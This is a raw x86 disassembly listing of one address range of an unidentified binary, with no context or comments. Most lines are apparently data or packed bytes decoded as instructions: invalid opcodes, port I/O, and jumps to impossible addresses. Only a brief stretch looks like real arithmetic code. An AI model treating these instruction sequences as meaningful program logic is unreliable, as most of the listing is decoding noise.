  406545:	sbb    dl,BYTE PTR [edx]
  406547:	aas    
  406548:	xor    DWORD PTR [esi-0x551ce803],edi
  40654e:	call   FWORD PTR [ebx+0x129e1818]
  406554:	sbb    BYTE PTR [eax],bl
  406556:	icebp  
  406557:	call   0xfb088ea5
  40655c:	jl     0x40651f
  40655e:	adc    eax,ebp
  406560:	jo     0x40651f
  406562:	in     eax,dx
  406563:	loop   0x406544
  406565:	nop
  406566:	iret   
  406567:	and    ebx,DWORD PTR [edx-0x683a9423]
  40656d:	in     eax,dx
  40656e:	mov    esi,0x1fb215fe
  406573:	call   0xe11e:0x45a9780c
  40657a:	mov    WORD PTR [ebx-0x24],es
  40657d:	pop    es
  40657e:	mov    ch,0xd6
  406580:	bound  ecx,QWORD PTR [esi]
  406582:	jmp    0xe81347d3
  406587:	sub    edx,edx
  406589:	mov    bh,0x60
  40658b:	and    al,0x7c
  40658d:	outs   dx,DWORD PTR ds:[esi]
  40658e:	add    DWORD PTR [ebp-0x19fd76c5],0x8
  406595:	dec    esi
  406596:	dec    esi
  406597:	mov    ebx,0xa9498cff
  40659c:	call   0xca7b4de6
  4065a1:	adc    BYTE PTR [ebx-0x11b405e3],0xe6
  4065a8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4065a9:	(bad)  
  4065aa:	fldcw  WORD PTR [bx+si-0x3f76]
  4065af:	or     eax,0x5a077e9b
  4065b4:	cwde   
  4065b5:	sar    BYTE PTR [esi+ebx*2-0x64],cl
  4065b9:	pop    ds
  4065ba:	cmp    al,0x41
  4065bc:	pushf  
  4065bd:	sahf   
  4065be:	dec    ebx
  4065bf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4065c0:	ss mov cl,cl
  4065c3:	out    dx,al
  4065c4:	fmulp  st(2),st
  4065c6:	std    
  4065c7:	enter  0xcd67,0x8
  4065cb:	mov    eax,0x1e91507c
  4065d0:	pop    es
  4065d1:	add    al,0x85
  4065d3:	aam    0xeb
  4065d5:	outs   dx,DWORD PTR ds:[esi]
  4065d6:	mov    bh,0x9f
  4065d8:	lock int 0xa8
  4065db:	jb     0x4065a7
  4065dd:	fisub  DWORD PTR [edi-0x7b2bdd53]
  4065e3:	mov    esi,0x2c7157d4
  4065e8:	retf   0xfd6f
  4065eb:	fidivr WORD PTR [ecx+0x430544fa]
  4065f1:	ins    BYTE PTR es:[edi],dx
  4065f2:	retf   0x4ceb
  4065f5:	sub    BYTE PTR [esi+0x2a],dl
  4065f8:	xchg   edx,eax
  4065f9:	jp     0x406609
  4065fb:	sbb    eax,0x40e47639
  406600:	jg     0x40661d
  406602:	cwde   
  406603:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406604:	fs popf 
  406606:	shl    DWORD PTR [esi+0x5fa38afd],1
  40660c:	outs   dx,BYTE PTR ds:[esi]
  40660d:	loop   0x4065d3
  40660f:	int    0x0
  406611:	in     eax,dx
  406612:	ret    0x6bcf
  406615:	fwait
  406616:	pop    ss
  406617:	adc    eax,0xd86d33c7
  40661c:	pop    ebp
  40661d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40661e:	sahf   
  40661f:	inc    ebp
  406620:	loope  0x40660e
  406622:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406623:	stc    
  406624:	adc    ecx,DWORD PTR [edi]
  406626:	xchg   ebp,eax
  406627:	cli    
  406628:	adc    al,0xdc
  40662a:	xchg   edx,eax
  40662b:	fisttp DWORD PTR [esp+eax*4-0x6e44e73]
  406632:	aas    
  406633:	int    0x9a
  406635:	adc    al,0x2e
  406637:	or     dh,BYTE PTR [ebx+esi*4]
  40663a:	je     0x406675
  40663c:	aaa    
  40663d:	pop    ds
  40663e:	mov    ebp,0x94424450
  406643:	push   edi
  406644:	push   ebp
  406645:	dec    esi
  406646:	and    BYTE PTR [esi-0x52],ch
  406649:	and    bl,dl
  40664b:	sbb    al,0x84
  40664d:	mov    al,ds:0x13913a4e
  406652:	ins    DWORD PTR es:[edi],dx
  406653:	pop    ss
  406654:	lds    esp,FWORD PTR [edx]
  406656:	inc    edi
  406657:	loop   0x40661d
  406659:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40665a:	xlat   BYTE PTR ds:[ebx]
  40665b:	fild   QWORD PTR [esi+0x45]
  40665e:	mov    edi,0x79e12962
  406663:	mov    edi,DWORD PTR [ecx+0x41]
  406666:	mov    eax,ds:0x70ccf4c3
  40666b:	in     al,0x6a
  40666d:	out    dx,al
  40666e:	daa    
  40666f:	mov    eax,0x636c4f6
  406674:	rcl    bh,0x3b
  406677:	pop    edi
  406678:	add    ecx,DWORD PTR [esi+0x37]
  40667b:	pop    es
  40667c:	aam    0x74
  40667e:	push   ebx
  40667f:	cli    
  406680:	push   ebx
  406681:	cmp    esp,DWORD PTR [esi+0x1cd568a0]
  406687:	push   edi
  406688:	inc    esi
  406689:	imul   ecx,DWORD PTR [ecx],0x63
  40668c:	adc    eax,DWORD PTR [ecx]
  40668e:	or     eax,DWORD PTR [esi-0x74]
  406691:	sub    BYTE PTR [ebp-0x5a],dl
  406694:	js     0x406628
  406696:	push   ecx
  406697:	or     al,0xa3
  406699:	mov    edi,0xe91a2998
  40669e:	push   edi
  40669f:	pop    ds
  4066a0:	add    DWORD PTR [esi+0x3155bcda],ebx
  4066a6:	add    al,0x7a
  4066a8:	push   eax
  4066a9:	out    dx,al
  4066aa:	test   al,dl
  4066ac:	or     DWORD PTR [esi],0x12
  4066af:	in     al,dx
  4066b0:	stos   DWORD PTR es:[edi],eax
  4066b1:	pop    eax
  4066b2:	in     eax,0x18
  4066b4:	push   edx
  4066b5:	test   ch,ch
  4066b7:	xchg   esp,eax
  4066b8:	jl     0x4066ca
  4066ba:	lea    esp,[edi]
  4066bc:	or     BYTE PTR [edx+0x38d8d65],0x5f
  4066c3:	mov    ss,WORD PTR [eax+ecx*4-0x50e9ae27]
  4066ca:	nop
  4066cb:	shl    DWORD PTR [edx],0xbc
  4066ce:	sub    eax,DWORD PTR [esi-0x6e9ee6e8]
  4066d4:	xor    eax,0xbc0cee04
  4066d9:	push   cs
  4066da:	data16 sub al,0xd7
  4066dd:	xchg   ecx,eax
  4066de:	ud2    
  4066e0:	mov    ebp,0x3ef54007
  4066e5:	xchg   ebp,eax
  4066e6:	mov    al,0x0
  4066e8:	jnp    0x406670
  4066ea:	jmp    0xbce1:0x292261f
  4066f1:	out    dx,eax
  4066f2:	div    DWORD PTR [ebx-0x293d9bae]
  4066f8:	jbe    0x406751
  4066fa:	mov    dh,0x20
  4066fc:	out    0x7a,eax
  4066fe:	test   DWORD PTR [eax+0x39],0xb43583c4
  406705:	es in  eax,0x9
  406708:	aam    0xc8
  40670a:	scas   al,BYTE PTR es:[edi]
  40670b:	pop    es
  40670c:	mov    eax,ds:0xdb63ad9e
  406711:	inc    ebp
  406712:	xlat   BYTE PTR gs:[ebx]
  406714:	jno    0x406758
  406716:	enter  0x52bb,0x24
  40671a:	sub    esi,DWORD PTR [ebx]
  40671c:	sub    cl,cl
  40671e:	mov    bl,0x51
  406720:	ins    BYTE PTR es:[edi],dx
  406721:	and    BYTE PTR [ebx+0x463bdc2d],bl
  406727:	add    DWORD PTR [edx-0x60],ebp
  40672a:	jge    0x40674f
  40672c:	aam    0xc2
  40672e:	mov    ?,WORD PTR [edx]
  406730:	loope  0x406752
  406732:	call   0xbc6a:0x3770b0b
  406739:	adc    ah,BYTE PTR [eax-0x1fc9ae15]
  40673f:	lock mov ebx,0x87d7d1cf
  406745:	enter  0x9187,0x13
  406749:	ins    BYTE PTR es:[edi],dx
  40674a:	mov    dh,0x35
  40674c:	les    eax,FWORD PTR [ebp+0x48855d5b]
  406752:	xchg   edi,eax
  406753:	lods   eax,DWORD PTR ds:[esi]
  406754:	dec    edx
  406755:	mov    ss:0x53986d7b,al
  40675b:	mov    al,ds:0xf7bea889
  406760:	mov    bl,0xc0
  406762:	(bad)  
  406763:	(bad)  
  406764:	fistp  WORD PTR [esi]
  406766:	pushf  
  406767:	pushf  
  406768:	ds sub al,0xf0
  40676b:	mov    dl,0xd2
  40676d:	jl     0x40674d
  40676f:	into   
  406770:	imul   ecx,ecx,0x7164c5a9
  406776:	push   es
  406777:	pushf  
  406778:	mul    BYTE PTR es:[eax-0x23]
  40677c:	lock pop eax
  40677e:	sbb    al,0x63
  406780:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406781:	add    al,0x44
  406783:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406784:	loop   0x40676d
  406786:	std    
  406787:	adc    DWORD PTR [edi+0x51d6f4df],0x1fee26da
  406791:	push   esp
  406792:	pop    ecx
  406793:	nop
  406794:	ins    BYTE PTR es:[edi],dx
  406795:	test   al,0xa0
  406797:	xor    DWORD PTR ds:0xfbb653c7,ecx
  40679d:	adc    ebx,0x397e1b93
  4067a3:	test   DWORD PTR [edi],edx
  4067a5:	es retf 
  4067a7:	mov    ecx,0xe8478d88
  4067ac:	repz push 0x3e
  4067af:	jmp    0x8918:0x10bafaa4
  4067b6:	cmp    eax,0xdf21b0d
  4067bb:	xchg   esp,eax
  4067bc:	into   
  4067bd:	aam    0x4a
  4067bf:	inc    cx
  4067c1:	sub    DWORD PTR [ebx-0x6834b58a],esi
  4067c7:	test   al,0xa6
  4067c9:	pop    esi
  4067ca:	adc    BYTE PTR [esi-0x25775662],cl
  4067d0:	mov    WORD PTR [eax+0x6d9f1c8],fs
  4067d6:	ja     0x4067bc
  4067d8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4067d9:	imul   edi,DWORD PTR [ebx-0x48796bd9],0xffffffcd
  4067e0:	lock mov esp,0x5bb02b41
  4067e6:	rcl    DWORD PTR [edx+0x7b],0xb4
  4067ea:	adc    BYTE PTR [edx-0x1ca60782],cl
  4067f0:	mov    DWORD PTR [edi+edx*8],ebp
  4067f3:	dec    esp
  4067f4:	scas   eax,DWORD PTR es:[edi]
  4067f5:	(bad)  
  4067f6:	imul   ecx,DWORD PTR [ebx-0x64],0xffffff91
  4067fa:	and    eax,0x636e3a9a
  4067ff:	stc    
  406800:	and    DWORD PTR [ecx],ebp
  406802:	sub    eax,0xc00ccc4a
  406807:	pop    ebx
  406808:	cs mov bl,0x3
  40680b:	outs   dx,BYTE PTR ds:[esi]
  40680c:	es jmp 0x406815
  40680f:	arpl   WORD PTR [eax-0x772be4c1],sp
  406815:	push   es
  406816:	cmp    al,0xe7
  406818:	aam    0x6b
  40681a:	sbb    edi,DWORD PTR ds:0xb7323ffc
  406820:	and    eax,0xe0b893f0
  406825:	in     eax,0x90
  406827:	iret   
  406828:	add    DWORD PTR [ecx],eax
  40682a:	stc    
  40682b:	call   0xc6571014
  406830:	lock test edi,esi
  406833:	mov    ds:0xca494a77,eax
  406838:	mov    ebp,0x483ab94e
  40683d:	sbb    ah,bh
  40683f:	nop
  406840:	fbld   TBYTE PTR [edi+0x2c]
  406843:	add    al,BYTE PTR [esi+0x54]
  406846:	and    al,0x2c
  406848:	adc    eax,0xe0b1173c
  40684d:	mov    al,0xcb
  40684f:	pop    edx
  406850:	and    edi,DWORD PTR [edi+ebx*1-0x5b6b2793]
  406857:	fs dec esi
  406859:	stos   BYTE PTR es:[edi],al
  40685a:	jns    0x406838
  40685c:	mov    cs,WORD PTR [ebx-0x6d9e8fa3]
  406862:	daa    
  406863:	cs or  dh,cl
  406866:	mov    eax,eax
  406868:	xor    edx,DWORD PTR [eax]
  40686a:	add    eax,0xcc71d855
  40686f:	jbe    0x406890
  406871:	mov    esi,0x2a56e8dc
  406876:	ins    DWORD PTR es:[edi],dx
  406877:	dec    ebp
  406878:	lods   eax,DWORD PTR fs:[esi]
  40687a:	push   eax
  40687b:	(bad)  
  40687c:	sbb    cl,BYTE PTR [ecx-0x7dd45b98]
  406882:	int3   
  406883:	jo     0x4068a8
  406885:	mov    WORD PTR [eax-0x7f],gs
  406888:	mov    ds:0x845ad760,eax
  40688d:	retf   0x5b60
  406890:	mov    cl,0xa9
  406892:	jno    0x4068a1
  406894:	cs es je 0x406895
  406898:	sbb    eax,0x8e68383b
  40689d:	stos   BYTE PTR es:[edi],al
  40689e:	sub    dl,BYTE PTR [edx]
  4068a0:	ret    0x9ea4
  4068a3:	shr    cl,0x12
  4068a6:	mov    esi,0x9cd658ab
  4068ab:	cmp    BYTE PTR [esi+0x523463ec],ch
  4068b1:	into   
  4068b2:	(bad)  
  4068b3:	mov    ds:0x413e34f6,al
  4068b8:	adc    esi,DWORD PTR [ebp-0x53]
  4068bb:	or     dl,BYTE PTR [eax+0x13]
  4068be:	sub    ch,BYTE PTR [ecx+edx*8+0x7201c7e8]
  4068c5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4068c6:	mov    bh,0x42
  4068c8:	bound  edi,QWORD PTR [eax]
  4068ca:	nop
  4068cb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4068cc:	popa   
  4068cd:	stc    
  4068ce:	mov    ds:0x815d0543,eax
  4068d3:	jge    0x406881
  4068d5:	pop    esp
  4068d6:	data16 (bad) 
  4068d8:	fstp   TBYTE PTR [ebp-0x40]
  4068db:	(bad)  
  4068dc:	jge    0x4068cc
  4068de:	mov    bh,0x94
  4068e0:	bound  esi,QWORD PTR [edx-0x2eff9e83]
  4068e6:	shl    DWORD PTR [eax-0x63],cl
  4068e9:	cld    
  4068ea:	inc    esp
  4068eb:	lods   eax,DWORD PTR ds:[esi]
  4068ec:	inc    ebx
  4068ed:	ja     0x406939
  4068ef:	jb     0x406925
  4068f1:	test   al,0x94
  4068f3:	cmp    BYTE PTR [esi],al
  4068f5:	cmc    
  4068f6:	aaa    
  4068f7:	mov    ch,0xdc
  4068f9:	fldcw  WORD PTR [ecx+0x4077cb6f]
  4068ff:	cld    
  406900:	nop
  406901:	inc    eax
  406902:	cmp    eax,0x752707a4
  406907:	inc    esp
  406908:	or     eax,0x17c2324d
  40690d:	sbb    DWORD PTR [ebx+ebx*8-0x4467fa85],ebp
  406914:	out    dx,al
  406915:	je     0x406979
  406917:	shl    ecx,0x1e
  40691a:	mov    ecx,DWORD PTR [ebp-0x14]
  40691d:	xor    eax,edi
  40691f:	xor    edx,edx
  406921:	or     eax,edx
  406923:	mov    cl,BYTE PTR [eax+ecx*1]
  406926:	mov    eax,DWORD PTR [ebp-0x34]
  406929:	or     BYTE PTR [eax],cl
  40692b:	mov    eax,DWORD PTR [ebp-0x10]
  40692e:	mov    ecx,DWORD PTR [ebp-0xc]
  406931:	shrd   eax,ecx,0x2
  406935:	shr    ecx,0x2
  406938:	mov    ecx,DWORD PTR [ebp-0x10]
  40693b:	mov    edx,DWORD PTR [ebp-0xc]
  40693e:	xor    eax,edi
  406940:	shl    ecx,0x1e
  406943:	xor    edx,edx
  406945:	or     eax,edx
  406947:	lea    eax,[ebp+eax*1-0x4]
  40694b:	mov    DWORD PTR [ebp-0x34],eax
  40694e:	mov    eax,DWORD PTR [ebp-0x10]
  406951:	mov    ecx,DWORD PTR [ebp-0xc]
  406954:	shrd   eax,ecx,0x2
  406958:	shr    ecx,0x2
  40695b:	mov    ecx,DWORD PTR [ebp-0x10]
  40695e:	mov    edx,DWORD PTR [ebp-0xc]
  406961:	xor    eax,edi
  406963:	jmp    0x406d41
  406968:	arpl   WORD PTR [eax],di
  40696a:	test   eax,0x2284a205
  40696f:	ss xchg esp,eax
  406971:	scas   al,BYTE PTR es:[edi]
  406972:	addr16 mov esp,0x7c790106
  406978:	test   DWORD PTR [ebx+0x129e1818],edx
  40697e:	sbb    BYTE PTR [eax],bl
  406980:	pop    es
  406981:	mov    esp,0x20e4de91
  406986:	jmp    0x5c841273
  40698b:	pop    edi
  40698c:	inc    eax
  40698d:	arpl   cx,sp
  40698f:	inc    esp
  406990:	in     al,0x23
  406992:	aaa    
  406993:	xchg   DWORD PTR [ecx+0x69c632d],edx
  406999:	into   
  40699a:	mov    eax,0x5fea7bd8
  40699f:	mov    edi,0x8ca96536
  4069a4:	outs   dx,BYTE PTR ds:[esi]
  4069a5:	std    
  4069a6:	or     eax,0x2380ea0e
  4069ab:	imul   esp,ebp,0x22
  4069ae:	cmp    eax,DWORD PTR [eax+0x958ccaa]
  4069b4:	adc    BYTE PTR [esi-0x25],bh
  4069b7:	xlat   BYTE PTR ds:[ebx]
  4069b8:	jns    0x40697e
  4069ba:	mov    ds,WORD PTR [esi-0xb2e3ee1]
  4069c0:	lock inc edx
  4069c2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4069c3:	repz cmp ah,BYTE PTR [ebp-0x6fdb8922]
  4069ca:	mov    ecx,0x20a2d2ff
  4069cf:	dec    esp
  4069d0:	sub    BYTE PTR [ecx-0x466c6a0d],bh
  4069d6:	sbb    DWORD PTR [edx+0x32423f1],ebp
  4069dc:	mov    dh,0x93
  4069de:	clc    
  4069df:	(bad)  
  4069e0:	mov    eax,ds:0x7b7cc492
  4069e5:	ret    
  4069e6:	shufps xmm0,XMMWORD PTR [edx+ebx*1-0x37884671],0x63
  4069ef:	(bad)  
  4069f0:	lods   al,BYTE PTR ds:[esi]
  4069f1:	mov    eax,ds:0xbc94f314
  4069f6:	sbb    al,0x15
  4069f8:	rol    DWORD PTR [edx],0x37
  4069fb:	bound  ebp,QWORD PTR [edx-0x52ede325]
  406a01:	jmp    0x20e98d65
  406a06:	inc    ecx
  406a07:	dec    esp
  406a08:	sbb    dl,BYTE PTR [esi]
  406a0a:	xchg   esp,eax
  406a0b:	inc    edi
  406a0c:	cmp    al,0x52
  406a0e:	cdq    
  406a0f:	push   esi
  406a10:	lahf   
  406a11:	xchg   ebx,eax
  406a12:	test   BYTE PTR [edi+ebx*1+0x7887863f],dl
  406a19:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406a1a:	pop    edi
  406a1b:	fsub   DWORD PTR [edi]
  406a1d:	(bad)  
  406a1e:	fimul  DWORD PTR [edi-0x5b833e4c]
  406a24:	adc    dl,bl
  406a26:	and    ah,BYTE PTR [edi]
  406a28:	hlt    
  406a29:	sub    al,0xa2
  406a2b:	fwait
  406a2c:	adc    al,0x58
  406a2e:	mov    dh,0xeb
  406a30:	pop    ebx
  406a31:	jmp    0x7941:0x5d44ea02
  406a38:	mov    esp,0xbb94cb47
  406a3d:	or     esi,eax
  406a3f:	xor    al,0xfd
  406a41:	(bad)  
  406a42:	in     al,dx
  406a43:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406a44:	adc    dh,BYTE PTR [esi]
  406a46:	sti    
  406a47:	popf   
  406a48:	div    DWORD PTR [ebp-0x42b0af63]
  406a4e:	div    DWORD PTR [esi]
  406a50:	mov    cs,WORD PTR [edi+0x65]
  406a53:	ds out dx,al
  406a55:	mov    cs,WORD PTR [edx]
  406a57:	arpl   WORD PTR [edx+0x6f],dx
  406a5a:	jmp    0x5a16746f
  406a5f:	adc    eax,0x3a0417e6
  406a64:	jmp    0x2bb7:0x6dfd02c6
  406a6b:	lahf   
  406a6c:	lds    edx,FWORD PTR [ebx]
  406a6e:	mov    ds:0x4065d8cf,al
  406a73:	in     eax,dx
  406a74:	in     al,0xd0
  406a76:	jp     0x406ada
  406a78:	retf   0x1926
  406a7b:	lds    ebx,FWORD PTR [eax]
  406a7d:	push   ss
  406a7e:	adc    al,0x85
  406a80:	cmp    eax,0xef059671
  406a85:	push   ss
  406a86:	pop    ecx
  406a87:	jmp    FWORD PTR [ecx]
  406a89:	adc    eax,0xc89ebbb8
  406a8e:	fsub   QWORD PTR [ebx-0x37]
  406a91:	pop    eax
  406a92:	cli    
  406a93:	sbb    al,0xd5
  406a95:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406a96:	pop    ebp
  406a97:	xor    BYTE PTR [esi-0x581a63d4],0x30
  406a9e:	mov    ah,0xf
  406aa0:	in     al,dx
  406aa1:	enter  0xb7a6,0x58
  406aa5:	mov    ebp,0x9d587faa
  406aaa:	cmp    dh,BYTE PTR [ebp+0x148e9be6]
  406ab0:	jno    0x406b14
  406ab2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406ab3:	dec    esp
  406ab4:	rcr    BYTE PTR [ebx+0x25],1
  406ab7:	(bad)  
  406ab9:	inc    edx
  406aba:	out    0xe,al
  406abc:	pop    ds
  406abd:	xlat   BYTE PTR ds:[bx]
  406abf:	or     edx,eax
  406ac1:	cwde   
  406ac2:	jno    0x406ae3
  406ac4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406ac5:	mov    ds:0x99d391b2,eax
  406aca:	lea    ebp,[ebp+0x50]
  406acd:	icebp  
  406ace:	add    edx,DWORD PTR [ebp-0x7f]
  406ad1:	dec    ebx
  406ad2:	or     edi,DWORD PTR [ebx+ecx*1-0x7dcfefe2]
  406ad9:	add    al,0x38
  406adb:	loopne 0x406b2e
  406add:	jl     0x406b46
  406adf:	cdq    
  406ae0:	ret    0xea46
  406ae3:	jno    0x406aec
  406ae5:	aaa    
  406ae6:	and    eax,0xdf03fe92
  406aeb:	out    0xaa,eax
  406aed:	rcr    DWORD PTR [ebx+0x22],0xb7
  406af1:	cld    
  406af2:	leave  
  406af3:	arpl   WORD PTR [edi+ecx*2+0x136a4cd6],cx
  406afa:	cld    
  406afb:	test   BYTE PTR [esi+0x41],0x1a
  406aff:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406b00:	pop    es
  406b01:	cmp    eax,0x6602b8ff
  406b06:	jnp    0x406b26
  406b08:	sbb    DWORD PTR [ecx-0x11093712],esi
  406b0e:	mov    ebx,0xd614d2dd
  406b13:	sahf   
  406b14:	sub    cl,ch
  406b16:	ficom  WORD PTR [edi-0x2bd0543c]
  406b1c:	mov    esp,0xcdf35a89
  406b21:	imul   edi,edi,0xf1482c98
  406b27:	loop   0x406b4d
  406b29:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406b2a:	dec    ecx
  406b2b:	mov    DWORD PTR [ecx-0x34c4d4e5],ecx
  406b31:	cwde   
  406b32:	jl     0x406b24
  406b34:	push   edi
  406b35:	xor    eax,0x45fe780d
  406b3a:	mov    al,0x7
  406b3c:	fistp  QWORD PTR [eax+0x8b9ce4a]
  406b42:	pop    es
  406b43:	jnp    0x406ad6
  406b45:	xor    ebp,DWORD PTR [ebp-0x5d]
  406b48:	loope  0x406b5f
  406b4a:	fs xchg ebp,eax
  406b4c:	pop    ds
  406b4d:	sub    BYTE PTR ds:0x9b69731c,bh
  406b53:	out    dx,al
  406b54:	cmc    
  406b55:	xchg   ecx,eax
  406b56:	cs jo  0x406b92
  406b59:	dec    edi
  406b5a:	add    DWORD PTR [esi+0x8],ebx
  406b5d:	inc    ebx
  406b5e:	jge    0x406b5f
  406b60:	mov    edx,0x4a80cb0f
  406b65:	sbb    al,0xd5
  406b67:	retf   
  406b68:	out    0xa3,eax
  406b6a:	(bad)  
  406b6b:	xor    bh,BYTE PTR ds:0x6cd7ce6e
  406b71:	fidiv  WORD PTR [edx+ecx*8]
  406b74:	adc    BYTE PTR [ebx+eax*2],dl
  406b77:	test   eax,0x7f6c26fa
  406b7c:	sbb    BYTE PTR [edx-0x28],bh
  406b7f:	cwde   
  406b80:	sti    
  406b81:	arpl   WORD PTR [ebx],si
  406b83:	cmp    ebp,DWORD PTR [ebp-0x69]
  406b86:	xor    BYTE PTR [eax-0xe],ch
  406b89:	(bad)  
  406b8a:	sbb    eax,eax
  406b8c:	repnz dec ebp
  406b8e:	jmp    0x8f82fa9
  406b93:	cmp    DWORD PTR [ebx-0x554f2b5b],0x19271ab
  406b9d:	and    ecx,ecx
  406b9f:	xchg   ecx,eax
  406ba0:	xchg   ebp,eax
  406ba1:	mov    cl,ch
  406ba3:	add    al,0x86
  406ba5:	out    0xfc,eax
  406ba7:	cdq    
  406ba8:	inc    esp
  406ba9:	call   0x9fce:0xcf0565c3
  406bb0:	repz je 0x406b35
  406bb3:	(bad)  [ecx-0x48]
  406bb6:	int3   
  406bb7:	(bad)  
  406bb8:	push   edi
  406bb9:	aaa    
  406bba:	xor    DWORD PTR [eax+0x28],ecx
  406bbd:	sbb    eax,0x1e8ce063
  406bc2:	xchg   ebp,eax
  406bc3:	stc    
  406bc4:	mov    bh,0x2d
  406bc6:	lea    edx,ds:0x59eb0baf
  406bcc:	or     edi,DWORD PTR [eax-0x7c948c33]
  406bd2:	(bad)  
  406bd3:	sub    eax,0xacc54c97
  406bd8:	or     esi,ecx
  406bda:	mov    dl,0xa8
  406bdc:	xchg   esp,eax
  406bdd:	xchg   ebx,eax
  406bde:	cdq    
  406bdf:	inc    esp
  406be0:	leave  
  406be1:	(bad)  
  406be2:	phsubsw mm2,QWORD PTR [eax]
  406be6:	loopne 0x406bc8
  406be8:	dec    edi
  406be9:	pop    edi
  406bea:	and    eax,DWORD PTR [bp+0x4dec]
  406bef:	pushf  
  406bf0:	in     eax,dx
  406bf1:	inc    esi
  406bf2:	pop    ebp
  406bf3:	icebp  
  406bf4:	shl    DWORD PTR [ebx+0x1d],cl
  406bf7:	rcl    DWORD PTR [ebp+edx*1-0xc1f78ea],1
  406bfe:	xor    BYTE PTR [esi-0x1d],bh
  406c01:	mov    dl,0x6d
  406c03:	nop
  406c04:	jns    0x406c6e
  406c06:	pop    ebp
  406c07:	and    eax,0xa90f3fdb
  406c0c:	or     BYTE PTR cs:[edi+0x6c206f21],ah
  406c13:	and    ecx,esi
  406c15:	lods   al,BYTE PTR gs:[esi]
  406c17:	cwde   
  406c18:	dec    edi
  406c19:	and    eax,0x42
  406c1c:	mov    al,0x2d
  406c1e:	sub    edi,DWORD PTR [ecx+0x61fa812a]
  406c24:	add    edi,DWORD PTR [ecx]
  406c26:	inc    eax
  406c27:	ins    BYTE PTR es:[edi],dx
  406c28:	mov    esi,0xf3c522f8
  406c2d:	into   
  406c2e:	int    0xc9
  406c30:	aad    0x41
  406c32:	ins    BYTE PTR es:[edi],dx
  406c33:	pop    ss
  406c34:	out    dx,al
  406c35:	xchg   ebp,eax
  406c36:	leave  
  406c37:	dec    ecx
  406c38:	dec    eax
  406c39:	push   ecx
  406c3a:	(bad)  
  406c3b:	icebp  
  406c3c:	ins    DWORD PTR es:[edi],dx
  406c3d:	cwde   
  406c3e:	push   ds
  406c3f:	pop    edx
  406c40:	imul   esp
  406c42:	(bad)
  406c45:	dec    ebx
  406c46:	pop    ecx
  406c47:	xchg   ebx,eax
  406c48:	sbb    dh,ah
  406c4a:	fild   QWORD PTR [ebp+0x1a]
  406c4d:	push   0xe327c409
  406c52:	push   esi
  406c53:	test   DWORD PTR [eax-0x181fe1e9],0xa28e17bf
  406c5d:	xchg   esi,eax
  406c5e:	add    DWORD PTR [ecx],0x4ab0053c
  406c64:	mov    dh,0x98
  406c66:	fdivp  st(6),st
  406c68:	inc    esi
  406c69:	or     bh,BYTE PTR [edx+0xea60f2]
  406c6f:	push   esp
  406c70:	fsub   QWORD PTR [edi+0x30e90e0f]
  406c76:	and    ecx,ebx
  406c78:	loopne 0x406c96
  406c7a:	mov    edx,0xf727cecc
  406c7f:	push   ebx
  406c80:	xchg   esp,eax
  406c81:	and    eax,0x9dda17f9
  406c86:	xchg   edi,eax
  406c87:	int3   
  406c88:	or     ecx,esp
  406c8a:	push   ecx
  406c8b:	pop    eax
  406c8c:	pop    ebx
  406c8d:	sti    
  406c8e:	push   0xffffff95
  406c90:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406c91:	rcr    BYTE PTR [esi-0x22bf0937],0xe6
  406c98:	or     ah,BYTE PTR [edi]
  406c9a:	stos   DWORD PTR es:[edi],eax
  406c9b:	xchg   ecx,eax
  406c9c:	mov    cl,0xed
  406c9e:	and    al,0xf6
  406ca0:	mov    ds:0xb9439503,eax
  406ca5:	mov    dh,BYTE PTR [eax+ebx*1+0x1074a379]
  406cac:	adc    ebx,DWORD PTR [ebx-0x1ba07ca5]
  406cb2:	out    0xef,eax
  406cb4:	jae    0x406c6c
  406cb6:	in     al,dx
  406cb7:	pop    esp
  406cb8:	mov    ecx,0x30fb5d03
  406cbd:	xor    eax,0x75906a8f
  406cc2:	repnz push es
  406cc4:	cmp    esi,DWORD PTR [ebp+ecx*2+0x4c83c2a4]
  406ccb:	jno    0x406d1b
  406ccd:	mov    dh,0xe3
  406ccf:	pusha  
  406cd0:	out    0x29,eax
  406cd2:	lds    eax,FWORD PTR [ecx+0x4d]
  406cd5:	jp     0x406d1b
  406cd7:	mov    eax,0x41e773e4
  406cdc:	(bad)  [edx-0x6a]
  406cdf:	dec    esi
  406ce0:	push   ss
  406ce1:	imul   ebp,DWORD PTR [ecx],0x25ee1f4e
  406ce7:	inc    ecx
  406ce8:	pop    esi
  406ce9:	cmc    
  406cea:	add    DWORD PTR [ecx+0x11],ebx
  406ced:	xor    esp,DWORD PTR [esi+eax*8+0x55effe2c]
  406cf4:	dec    ecx
  406cf5:	repnz push ecx
  406cf7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406cf8:	(bad)  
  406cf9:	out    dx,eax
  406cfa:	pop    edi
  406cfb:	jns    0x406cc2
  406cfd:	arpl   cx,di
  406cff:	inc    esp
  406d00:	pop    eax
  406d01:	xchg   DWORD PTR [edx],edx
  406d03:	xchg   ebp,eax
  406d04:	inc    ecx
  406d05:	xchg   edi,eax
  406d06:	sub    esp,DWORD PTR [esi]
  406d08:	xchg   edi,eax
  406d09:	push   esp
  406d0a:	xor    bl,al
  406d0c:	dec    edi
  406d0d:	enter  0x1854,0xa8
  406d11:	pop    ebp
  406d12:	cmp    DWORD PTR [eax-0x28270e42],0x17
  406d19:	or     DWORD PTR [ecx+ebp*4],ecx
